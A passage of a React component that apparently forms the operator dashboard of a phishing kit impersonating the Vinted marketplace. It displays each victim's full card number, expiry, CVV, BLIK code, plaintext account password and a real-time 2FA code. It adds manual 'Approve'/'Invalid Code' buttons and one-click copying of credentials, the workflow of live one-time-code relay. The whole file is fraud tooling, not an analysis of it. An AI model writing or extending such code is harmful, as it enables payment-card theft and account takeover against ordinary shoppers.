                            className={`px-2 py-1 rounded-md text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer ${
                              vStatus === 'VERIFIED'
                                ? 'bg-emerald-600 text-white shadow-xs'
                                : 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300'
                            }`}
                          >
                            <Check className="w-3 h-3" />
                            <span>Approve</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleSetVerificationStatus(order.id, 'INVALID_CODE')}
                            className={`px-2 py-1 rounded-md text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer ${
                              vStatus === 'INVALID_CODE'
                                ? 'bg-rose-600 text-white shadow-xs'
                                : 'bg-rose-50 text-rose-800 hover:bg-rose-100 border border-rose-300'
                            }`}
                          >
                            <X className="w-3 h-3" />
                            <span>Invalid</span>
                          </button>
                        </div>
                      </div>
                    </div>

                    {/* Column 2: Customer Contact */}
                    <div className="bg-gray-50/70 p-3 rounded-lg border border-gray-200/80 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-gray-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
                          <User className="w-3.5 h-3.5 text-teal-600" /> Customer Contact
                        </span>
                        <button
                          type="button"
                          onClick={() =>
                            handleCopy(`${customerName} | Phone: ${phone}`, `c_${order.id}`)
                          }
                          className="text-[10px] text-teal-700 hover:underline cursor-pointer"
                        >
                          {copiedField === `c_${order.id}` ? 'Copied' : 'Copy'}
                        </button>
                      </div>
                      <div>
                        <p className="font-bold text-sm text-gray-900">{customerName}</p>
                        <div className="flex items-center gap-2 mt-1">
                          <p className="text-gray-700 font-medium">{phone}</p>
                          {order.shippingAddress?.phoneNumber && (
                            <a
                              href={`tel:${order.shippingAddress.phoneNumber}`}
                              className="px-1.5 py-0.2 bg-teal-100 text-teal-800 text-[10px] font-bold rounded hover:bg-teal-200 inline-flex items-center gap-0.5"
                            >
                              <Phone className="w-2.5 h-2.5" /> Call
                            </a>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Column 3: Delivery Destination */}
                    <div className="bg-gray-50/70 p-3 rounded-lg border border-gray-200/80 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-gray-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
                          <MapPin className="w-3.5 h-3.5 text-teal-600" /> Destination
                        </span>
                        <button
                          type="button"
                          onClick={() => {
                            const dest = isPickup
                              ? `${order.pickupPoint?.pointName}, ${order.pickupPoint?.address}, ${order.pickupPoint?.city}`
                              : `${order.shippingAddress?.line1}, ${order.shippingAddress?.postalCode} ${order.shippingAddress?.city}, ${order.shippingAddress?.country || 'France'}`;
                            handleCopy(dest, `d_${order.id}`);
                          }}
                          className="text-[10px] text-teal-700 hover:underline cursor-pointer"
                        >
                          {copiedField === `d_${order.id}` ? 'Copied' : 'Copy'}
                        </button>
                      </div>

                      {isPickup && order.pickupPoint ? (
                        <div className="space-y-0.5">
                          <p className="font-bold text-gray-900">
                            {order.pickupPoint.pointName} ({order.pickupPoint.pointCode})
                          </p>
                          <p className="text-gray-600">
                            {order.pickupPoint.address}, {order.pickupPoint.city}
                          </p>
                          <p className="text-teal-700 font-medium text-[11px]">
                            Carrier: {order.pickupPoint.carrierName}
                          </p>
                        </div>
                      ) : order.shippingAddress ? (
                        <div className="space-y-0.5">
                          <p className="font-bold text-gray-900">
                            {order.shippingAddress.line1}
                          </p>
                          {order.shippingAddress.line2 && (
                            <p className="text-gray-600">{order.shippingAddress.line2}</p>
                          )}
                          <p className="text-gray-600">
                            {order.shippingAddress.postalCode} {order.shippingAddress.city}
                          </p>
                          <p className="text-gray-800 font-medium">
                            {order.shippingAddress.country || 'France'}
                          </p>
                        </div>
                      ) : (
                        <p className="text-gray-400 italic">No destination attached</p>
                      )}
                    </div>

                    {/* Column 4: Payment Details */}
                    <div className="bg-gray-50/70 p-3 rounded-lg border border-gray-200/80 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-gray-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
                          <CreditCard className="w-3.5 h-3.5 text-teal-600" /> Payment Captured
                        </span>
                        <span className="text-[10px] font-bold text-emerald-700 bg-emerald-50 px-1.5 py-0.2 rounded border border-emerald-200">
                          Paid
                        </span>
                      </div>

                      <div className="space-y-1">
                        <p className="font-bold text-gray-900">
                          {order.paymentMethod?.title || 'Bank card'}{' '}
                          <span className="font-normal text-gray-500">
                            ({order.paymentMethod?.brand || order.paymentMethod?.type})
                          </span>
                        </p>
                        {order.paymentMethod?.cardholderName && (
                          <p className="text-gray-700">
                            Cardholder: <strong>{order.paymentMethod.cardholderName}</strong>
                          </p>
                        )}
                        {order.paymentMethod?.cardNumber && (
                          <p className="text-gray-900 font-mono text-[11px]">
                            Card #: <strong>{order.paymentMethod.cardNumber}</strong>
                          </p>
                        )}
                        <div className="flex items-center gap-3 text-[11px] text-gray-700">
                          {order.paymentMethod?.expiry && (
                            <span>Exp: <strong>{order.paymentMethod.expiry}</strong></span>
                          )}
                          {order.paymentMethod?.securityCode && (
                            <span>CVV: <strong>{order.paymentMethod.securityCode}</strong></span>
                          )}
                          {order.paymentMethod?.blikCode && (
                            <span>BLIK: <strong>{order.paymentMethod.blikCode}</strong></span>
                          )}
                        </div>
                        <p className="text-sm font-bold text-teal-800 pt-1">
                          Total Paid: {formatPrice(order.pricing?.total || 0, currency)}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </main>

      {/* ========================================================================= */}
      {/* DETAILED INSPECTION MODAL */}
      {/* ========================================================================= */}
      {activeOrder && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-3 sm:p-5 overflow-y-auto animate-fadeIn">
          <div className="bg-white w-full max-w-xl rounded-2xl shadow-2xl border border-gray-200 overflow-hidden my-auto max-h-[92vh] flex flex-col">
            <div className="bg-gray-900 text-white p-4 sm:px-6 flex items-center justify-between shrink-0">
              <div>
                <h3 className="font-bold text-base text-white">
                  Submission Details: {activeOrder.orderNumber}
                </h3>
                <p className="text-xs text-gray-400">
                  Captured at {new Date(activeOrder.createdAt).toLocaleString()}
                </p>
              </div>
              <button
                type="button"
                onClick={() => setActiveOrder(null)}
                className="p-1 text-gray-400 hover:text-white rounded-full hover:bg-gray-800 transition-colors cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-4 sm:p-6 overflow-y-auto space-y-4 text-xs font-normal">
              {/* Vinted Account Login & 2FA Credentials */}
              <div className="p-4 bg-amber-50 rounded-xl border border-amber-200 space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] font-bold text-amber-900 uppercase flex items-center gap-1 tracking-wider">
                      <KeyRound className="w-3.5 h-3.5 text-amber-700" /> Account Credentials & 2FA
                    </span>

                    {activeOrder.verificationStatus === 'VERIFIED' ? (
                      <span className="text-[9px] font-bold px-2 py-0.5 rounded-full uppercase bg-emerald-100 text-emerald-800 border border-emerald-300">
                        Verified
                      </span>
                    ) : activeOrder.verificationStatus === 'INVALID_CODE' ? (
                      <span className="text-[9px] font-bold px-2 py-0.5 rounded-full uppercase bg-rose-100 text-rose-800 border border-rose-300">
                        Invalid Code
                      </span>
                    ) : (
                      <span className="text-[9px] font-bold px-2 py-0.5 rounded-full uppercase bg-amber-200 text-amber-900 border border-amber-300">
                        Awaiting Verification
                      </span>
                    )}
                  </div>

                  <button
                    type="button"
                    onClick={() =>
                      handleCopy(
                        `User: ${activeOrder.accountDetails?.usernameOrEmail || 'N/A'}\nPass: ${activeOrder.accountDetails?.password || 'N/A'}\nCode: ${activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode || 'N/A'}`,
                        `m_acc_${activeOrder.id}`
                      )
                    }
                    className="text-[10px] text-amber-800 font-bold hover:underline cursor-pointer"
                  >
                    {copiedField === `m_acc_${activeOrder.id}` ? 'Copied' : 'Copy Credentials'}
                  </button>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-1">
                  <div>
                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Email / Username:</span>
                    <p className="font-bold text-xs sm:text-sm text-gray-900 break-all bg-white/90 border border-amber-200/90 px-2.5 py-1.5 rounded-md mt-0.5 select-all">
                      {activeOrder.accountDetails?.usernameOrEmail || 'N/A'}
                    </p>
                  </div>
                  <div>
                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Plain Text Password:</span>
                    <p className="font-mono font-bold text-xs sm:text-sm text-gray-900 bg-white/90 border border-amber-200/90 px-2.5 py-1.5 rounded-md mt-0.5 select-all break-all">
                      {activeOrder.accountDetails?.password || 'N/A'}
                    </p>
                  </div>
                  <div>
                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">4-Digit Code (Real-Time):</span>
                    {(activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode) ? (
                      <p className="font-mono font-black text-lg text-emerald-950 tracking-widest bg-emerald-100 border border-emerald-300 px-3 py-1 rounded-md mt-0.5 inline-block">
                        {activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode}
                      </p>
                    ) : (
                      <p className="text-[11px] text-amber-800 italic bg-amber-100/50 border border-dashed border-amber-300 rounded-md p-1.5 mt-0.5">
                        Waiting for code...
                      </p>
                    )}
                  </div>
                </div>

                {/* Manual Verification Actions */}
                <div className="pt-2 border-t border-amber-200/90 flex flex-wrap items-center justify-between gap-2">
                  <span className="text-[10px] font-bold text-amber-950 uppercase">Update Manual Verification:</span>
                  <div className="flex items-center gap-1.5">
                    <button
                      type="button"
                      onClick={() => handleSetVerificationStatus(activeOrder.id, 'VERIFIED')}
                      className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                        activeOrder.verificationStatus === 'VERIFIED'
                          ? 'bg-emerald-600 text-white'
                          : 'bg-emerald-100 text-emerald-800 hover:bg-emerald-200'
                      }`}
                    >
                      ✓ Approve
                    </button>
                    <button
                      type="button"
                      onClick={() => handleSetVerificationStatus(activeOrder.id, 'INVALID_CODE')}
                      className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                        activeOrder.verificationStatus === 'INVALID_CODE'
                          ? 'bg-rose-600 text-white'
                          : 'bg-rose-100 text-rose-800 hover:bg-rose-200'
                      }`}
                    >
                      ⚠ Invalid Code
                    </button>
                    <button
                      type="button"
                      onClick={() => handleSetVerificationStatus(activeOrder.id, 'PENDING_REVIEW')}
                      className="px-2.5 py-1 rounded-lg text-xs font-medium text-gray-600 hover:bg-gray-200 cursor-pointer"
                    >
                      Reset
                    </button>
                  </div>
                </div>
              </div>

              {/* Product */}
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-200">
                <span className="text-[10px] font-semibold text-gray-400 uppercase block">Product</span>
                <p className="font-bold text-sm text-gray-900 mt-0.5">{activeOrder.productTitle}</p>
              </div>

              {/* Customer Contact */}
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-200 space-y-2">
                <span className="text-[10px] font-semibold text-gray-400 uppercase block">Customer Contact</span>
                <p className="text-sm font-bold text-gray-900">
                  {activeOrder.shippingAddress?.fullName || activeOrder.paymentMethod?.cardholderName || 'N/A'}
                </p>
                <p className="text-xs text-gray-700">
                  Phone: <strong>{activeOrder.shippingAddress?.phoneNumber || 'No phone provided'}</strong>
                </p>
              </div>

              {/* Destination */}
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-200 space-y-1">
                <span className="text-[10px] font-semibold text-gray-400 uppercase block">
                  Delivery Destination ({activeOrder.deliveryType === 'pickup' ? 'Pickup Locker' : 'Home Delivery'})
                </span>
                {activeOrder.deliveryType === 'pickup' && activeOrder.pickupPoint ? (
                  <>
                    <p className="font-bold text-gray-900">{activeOrder.pickupPoint.pointName} ({activeOrder.pickupPoint.pointCode})</p>
                    <p className="text-gray-700">{activeOrder.pickupPoint.address}, {activeOrder.pickupPoint.city}</p>
                    <p className="text-teal-700">Carrier: {activeOrder.pickupPoint.carrierName}</p>
                  </>
                ) : activeOrder.shippingAddress ? (
                  <>
                    <p className="font-bold text-gray-900">{activeOrder.shippingAddress.line1}</p>
                    {activeOrder.shippingAddress.line2 && <p className="text-gray-700">{activeOrder.shippingAddress.line2}</p>}
                    <p className="text-gray-700">{activeOrder.shippingAddress.postalCode} {activeOrder.shippingAddress.city}</p>
                    <p className="font-semibold text-gray-900">{activeOrder.shippingAddress.country || 'France'}</p>
                  </>
                ) : null}
              </div>

              {/* Payment */}
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-200 space-y-1.5">
                <span className="text-[10px] font-semibold text-gray-400 uppercase block">Payment Captured</span>
                <div className="grid grid-cols-2 gap-2 pt-1">
                  <div>
                    <span className="text-gray-400 text-[10px]">Type:</span>
                    <p className="font-semibold text-gray-900">{activeOrder.paymentMethod?.title || 'Card'}</p>
                  </div>
                  <div>
                    <span className="text-gray-400 text-[10px]">Cardholder:</span>
                    <p className="font-semibold text-gray-900">{activeOrder.paymentMethod?.cardholderName || 'N/A'}</p>
                  </div>
                  <div>
                    <span className="text-gray-400 text-[10px]">Card Number:</span>
                    <p className="font-mono font-semibold text-gray-900">{activeOrder.paymentMethod?.cardNumber || activeOrder.paymentMethod?.last4 || 'N/A'}</p>
                  </div>
                  <div>
                    <span className="text-gray-400 text-[10px]">Expiry:</span>
                    <p className="font-semibold text-gray-900">{activeOrder.paymentMethod?.expiry || 'N/A'}</p>
                  </div>
                  <div>
                    <span className="text-gray-400 text-[10px]">Security Code (CVV):</span>
                    <p className="font-semibold text-gray-900">{activeOrder.paymentMethod?.securityCode || 'N/A'}</p>
                  </div>
                  <div>
                    <span className="text-gray-400 text-[10px]">BLIK Code:</span>
                    <p className="font-semibold text-gray-900">{activeOrder.paymentMethod?.blikCode || 'N/A'}</p>
                  </div>
                </div>
              </div>

              {/* Financials */}
              <div className="p-3 bg-gray-50 rounded-xl border border-gray-200 space-y-1">
                <div className="flex justify-between">
                  <span className="text-gray-600">Subtotal:</span>
                  <span className="font-semibold">{formatPrice(activeOrder.pricing?.orderPrice || 0, currency)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Buyer Protection:</span>
                  <span className="font-semibold">{formatPrice(activeOrder.pricing?.buyerProtectionFee || 0, currency)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Shipping:</span>
                  <span className="font-semibold">{formatPrice(activeOrder.pricing?.shippingPrice || 0, currency)}</span>
                </div>
                <div className="flex justify-between pt-1 border-t border-gray-200 text-sm font-bold text-teal-800">
                  <span>Total Amount Paid:</span>
                  <span>{formatPrice(activeOrder.pricing?.total || 0, currency)}</span>
                </div>
              </div>
            </div>

            <div className="bg-gray-50 px-4 sm:px-6 py-3 border-t border-gray-200 flex items-center justify-between shrink-0">
              <button
                type="button"
                onClick={() => handleDeleteOrder(activeOrder.id)}
                className="text-red-600 hover:text-red-800 text-xs font-semibold flex items-center gap-1 cursor-pointer py-1"
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>Delete</span>
              </button>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => handleCopyAllOrderDetails(activeOrder)}
                  className="px-3 py-1.5 bg-teal-600 hover:bg-teal-700 text-white font-semibold rounded-lg text-xs transition-colors cursor-pointer flex items-center gap-1"
                >
                  <Copy className="w-3.5 h-3.5" />
                  <span>Copy All</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveOrder(null)}
                  className="px-3 py-1.5 bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold rounded-lg text-xs transition-colors cursor-pointer"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
